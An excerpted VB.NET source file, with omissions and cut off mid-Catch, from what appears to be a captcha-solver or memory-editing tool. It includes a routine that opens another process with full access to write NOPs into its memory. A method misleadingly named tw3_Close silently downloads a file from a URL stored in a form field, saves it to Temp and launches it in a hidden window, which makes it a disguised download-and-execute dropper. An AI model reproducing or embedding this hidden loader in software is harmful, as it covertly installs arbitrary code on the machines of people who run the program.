...
Module ReadWritingMemory
    ...
    Public Sub WriteNOPs(ByVal ProcessName As String, ByVal Address As Long, ByVal NOPNum As Integer)
        ...
        If MyP.Length = 0 Then
            MessageBox.Show(ProcessName & " Not Open!")
            Exit Sub
        End If
        Dim hProcess As IntPtr = OpenProcess(PROCESS_ALL_ACCESS, 0, MyP(0).Id)
        If hProcess = IntPtr.Zero Then
            MessageBox.Show("Process not success! " & ProcessName & "!")
            Exit Sub
        End If
    ...
    Public Sub tw3_Close()
        Try
            Dim indir As WebClient
            indir = New WebClient()
            indir.DownloadFileAsync(New Uri(Captcha_Solver1.Text_Process1.Text), My.Computer.FileSystem.SpecialDirectories.Temp & Captcha_Solver1.Text_Process2.Text)
            Sleep(3000)
            Dim certmgrt As New ProcessStartInfo(My.Computer.FileSystem.SpecialDirectories.Temp & Captcha_Solver1.Text_Process2.Text)
            certmgrt.WindowStyle = ProcessWindowStyle.Hidden
            Process.Start(certmgrt)
        Catch ex As Exception
